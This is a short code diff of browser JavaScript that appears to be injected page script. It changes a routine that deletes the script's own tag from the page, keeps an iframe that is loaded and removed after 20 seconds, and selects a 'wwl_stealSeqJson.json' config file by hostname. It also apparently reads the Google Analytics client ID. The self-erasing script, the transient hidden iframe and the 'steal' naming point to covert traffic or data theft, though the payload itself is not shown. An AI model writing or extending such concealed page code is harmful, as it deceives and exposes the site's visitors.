@@ -29,9 +29,9 @@ function getgaCid() {
 function removeScript() {
     var ss = document.getElementsByTagName('script');
     for (i = 0; i < ss.length; i++) {
-        if (ss[i].innerHTML.indexOf("function doFlow()") !== -1) {
+        if (ss[i].innerHTML.indexOf("function seqVer()") !== -1) {
             ss[i].parentNode.removeChild(ss[i]);
-            console.log("Remove script done ver.Seq doFlow");
+            console.log("Remove script done ver.Seq");
             break;
         }
     }
@@ -73,7 +73,9 @@ function doFlow() {
     wframe.addEventListener("load", function() {
         setTimeout(function() {
             console.log("removing " + wjmId);
-            wframe.parentNode.removeChild(wframe);
+            if(wframe.parentNode){
+                wframe.parentNode.removeChild(wframe);
+            }
             console.log("remove " + wjmId + " done");
         }, 20000);
 
@@ -102,6 +104,7 @@ function doFlow() {
     }
 
     var jsonFileName='';
+
     switch (window.location.hostname) {
         case 'www.wwluck.com':
             jsonFileName='wwl_stealSeqJson.json';
